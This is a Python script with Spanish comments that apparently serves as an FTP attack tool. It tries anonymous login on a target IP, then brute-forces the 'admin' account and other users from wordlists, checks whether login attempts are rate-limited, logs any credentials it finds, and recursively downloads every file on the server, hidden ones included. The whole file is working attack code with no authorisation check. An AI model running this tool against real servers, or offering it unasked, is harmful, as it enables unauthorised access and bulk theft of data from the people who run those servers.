import ftplib
import os
import sys

def check_ftp_anonymous(target_ip, output_file):
    print(f"[*] Verificando acceso FTP anónimo en {target_ip}...")
    try:
        ftp = ftplib.FTP(target_ip)
        ftp.login("anonymous", "anonymous")
        print("[+] ¡Anonymous login habilitado!")

        os.makedirs(f"logs/{target_ip}/ftp", exist_ok=True)

        with open(output_file, 'w') as f:
            f.write(f"Habilitado FTP anonymous login en {target_ip}")

        # Procedemos a descargar archivos si el acceso es exitoso
        dump_ftp_contents(ftp, target_ip)
        ftp.quit()
    except ftplib.error_perm:
        print("[-] El acceso anónimo está deshabilitado.")
        # Iniciamos la casuística del mini-bruteforce con usuario 'admin'
        mini_bruteforce(target_ip)
    except Exception as e:
        print(f"[!] Error al conectar con FTP: {e}")

def mini_bruteforce(target_ip):
    print("[*] Iniciando mini bruteforce con usuario 'admin'...")
    encontrado = False
    wordlist_path = "wordlists/misc/mini_bruteforcing_passwords.txt"
    try:
        with open(wordlist_path, 'r') as wl:
            passwords = [line.strip() for line in wl if line.strip()]
    except Exception as e:
        print(f"[!] Error al leer el wordlist mini bruteforce: {e}")
        return

    for pwd in passwords:
        try:
            ftp = ftplib.FTP(target_ip, timeout=5)
            ftp.login("admin", pwd)
            print(f"[+] Credenciales válidas encontradas: admin:{pwd}")
            # Log de credenciales débiles
            log_path = f"logs/{target_ip}/ftp/credentials_found.txt"
            os.makedirs(os.path.dirname(log_path), exist_ok=True)
            with open(log_path, "w") as logf:
                logf.write(f"Credenciales FTP débiles encontradas: admin:{pwd} (obtenidas por fuerza bruta)")
            dump_ftp_contents(ftp, target_ip)
            ftp.quit()
            encontrado = True
            break
        except ftplib.error_perm:
            # Credenciales incorrectas; continuar con el siguiente intento
            pass
        except Exception as e:
            print(f"[!] Error al probar admin:{pwd} - {e}")

    # Tras el mini-bruteforce, probamos admin:admin para ver si estamos bloqueados
    print("[*] Probando login con credenciales admin:admin para verificar limitación de intentos...")
    limite_libre = False
    try:
        ftp = ftplib.FTP(target_ip, timeout=5)
        ftp.login("admin", "admin")
        # Si llega aquí, significa que se ha procesado el intento, aunque las credenciales sean inválidas,
        # lo que indica que el servidor sigue respondiendo normalmente.
        print("[+] Se pudo procesar el intento de login con admin:admin, indicando que no estamos bloqueados.")
        log_path = f"logs/{target_ip}/ftp/no_limite_intentos.txt"
        os.makedirs(os.path.dirname(log_path), exist_ok=True)
        with open(log_path, "w") as logf:
            logf.write("No hay límite de intentos en el login FTP.")
        ftp.quit()
        limite_libre = True
    except ftplib.error_perm as e:
        error_msg = str(e)
        # Si el error contiene "530" (usualmente "login incorrect"), se asume que no hay bloqueo
        if "530" in error_msg:
            print("[+] Login fallido con admin:admin (credenciales inválidas), pero no se detecta bloqueo de intentos.")
            limite_libre = True
        else:
            print("[-] Error al probar admin:admin: ", error_msg)
    except Exception as e:
        print(f"[!] Error al probar admin:admin - {e}")

    # Si no se han encontrado credenciales en el mini-bruteforce y no estamos bloqueados,
    # se inicia el bruteforce elaborado.
    if limite_libre and not encontrado:
        print("[*] Iniciando brute force elaborado...")
        ftp_elaborate_bruteforce(target_ip)
    elif not limite_libre:
        print("[*] No se realizará el brute force elaborado debido a posible limitación de intentos.")

def ftp_elaborate_bruteforce(target_ip):
    # Esta función implementa un brute force más elaborado
    print("[*] Iniciando brute force elaborado...")
    # Primero, se intenta cargar wordlists personalizadas para la ip objetivo
    custom_dir = f"wordlists/{target_ip}"
    users = []
    passwords = []
    # Si existe una carpeta personalizada, se buscan users.txt y passwords.txt
    if os.path.isdir(custom_dir):
        user_file = os.path.join(custom_dir, "users.txt")
        pwd_file = os.path.join(custom_dir, "passwords.txt")
        if os.path.isfile(user_file):
            try:
                with open(user_file, 'r') as uf:
                    users = [line.strip() for line in uf if line.strip()]
                print(f"[*] Se cargaron {len(users)} usuarios desde {user_file}")
            except Exception as e:
                print(f"[!] Error al leer {user_file}: {e}")
        if os.path.isfile(pwd_file):
            try:
                with open(pwd_file, 'r') as pf:
                    passwords = [line.strip() for line in pf if line.strip()]
                print(f"[*] Se cargaron {len(passwords)} contraseñas desde {pwd_file}")
            except Exception as e:
                print(f"[!] Error al leer {pwd_file}: {e}")
    # Si no se tienen usuarios o contraseñas personalizados, se usan los de misc
    if not users:
        default_users_path = "wordlists/misc/ftp-top_default_passlist.txt"
        # En este archivo, cada línea es de la forma usuario:contraseña
        try:
            with open(default_users_path, 'r') as df:
                combos = [line.strip() for line in df if line.strip()]
            print(f"[*] Se cargaron {len(combos)} combos desde {default_users_path}")
            # Intentamos cada combo
            for combo in combos:
                try:
                    user, pwd = combo.split(":", 1)
                    ftp = ftplib.FTP(target_ip, timeout=5)
                    ftp.login(user, pwd)
                    print(f"[+] Credenciales válidas encontradas: {user}:{pwd}")
                    log_path = f"logs/{target_ip}/ftp/credentials_found.txt"
                    os.makedirs(os.path.dirname(log_path), exist_ok=True)
                    with open(log_path, "w") as logf:
                        logf.write(f"Credenciales FTP débiles encontradas: {user}:{pwd} (obtenidas por fuerza bruta)")
                    dump_ftp_contents(ftp, target_ip)
                    ftp.quit()
                    return
                except ftplib.error_perm:
                    pass
                except Exception as e:
                    print(f"[!] Error al probar {combo} - {e}")
        except Exception as e:
            print(f"[!] Error al leer la lista por defecto {default_users_path}: {e}")
    else:
        # Si tenemos usuarios personalizados pero no contraseñas, combinamos con una lista de contraseñas de misc
        if users and not passwords:
            default_pw_path = "wordlists/misc/ftp-passwords.txt"
            try:
                with open(default_pw_path, 'r') as dpf:
                    passwords = [line.strip() for line in dpf if line.strip()]
                print(f"[*] Se cargaron {len(passwords)} contraseñas desde {default_pw_path} para combinar con usuarios personalizados")
            except Exception as e:
                print(f"[!] Error al leer {default_pw_path}: {e}")
        # Bruteforce combinando usuarios y contraseñas
        for user in users:
            for pwd in passwords:
                try:
                    ftp = ftplib.FTP(target_ip, timeout=5)
                    ftp.login(user, pwd)
                    print(f"[+] Credenciales válidas encontradas: {user}:{pwd}")
                    log_path = f"logs/{target_ip}/ftp/credentials_found.txt"
                    os.makedirs(os.path.dirname(log_path), exist_ok=True)
                    with open(log_path, "w") as logf:
                        logf.write(f"Credenciales FTP débiles encontradas: {user}:{pwd} (obtenidas por fuerza bruta)")
                    dump_ftp_contents(ftp, target_ip)
                    ftp.quit()
                    return
                except ftplib.error_perm:
                    pass
                except Exception as e:
                    print(f"[!] Error al probar {user}:{pwd} - {e}")

    print("[-] Bruteforce elaborado finalizado sin encontrar credenciales válidas.")

def dump_ftp_contents(ftp, target_ip, remote_path="/", local_path=None):
    if local_path is None:
        local_path = f"logs/{target_ip}/ftp/dump/"

    os.makedirs(local_path, exist_ok=True)

    try:
        ftp.cwd(remote_path)
        # Lista completa de archivos y carpetas, incluyendo ocultos
        file_list = []
        ftp.retrlines("LIST -a", file_list.append)

        for line in file_list:
            parts = line.split()
            name = " ".join(parts[8:])  # El nombre del archivo puede contener espacios
            file_type = parts[0][0]     # Primer carácter indica tipo (d=directorio, -=archivo)

            if name in [".", ".."]:
                continue  # Omitir enlaces a directorios padre/actual

            remote_item_path = f"{remote_path}/{name}".replace("//", "/")  # Asegurar formato correcto

            if file_type == "d":  # Si es un directorio
                new_local_path = os.path.join(local_path, name)
                os.makedirs(new_local_path, exist_ok=True)
                dump_ftp_contents(ftp, target_ip, remote_item_path, new_local_path)
            else:  # Si es un archivo, lo descargamos
                local_file = os.path.join(local_path, name)
                try:
                    with open(local_file, "wb") as f:
                        ftp.retrbinary(f"RETR {remote_item_path}", f.write)
                    print(f"[+] Archivo descargado: {local_file}")
                except Exception as e:
                    print(f"[!] Error al descargar {name}: {e}")

    except Exception as e:
        print(f"[!] Error al listar archivos en {remote_path}: {e}")

# Main de prueba
if __name__ == "__main__":
    target = sys.argv[1]
    anonymous_file = f"logs/{target}/ftp/anonymous.txt"
    check_ftp_anonymous(target, anonymous_file)
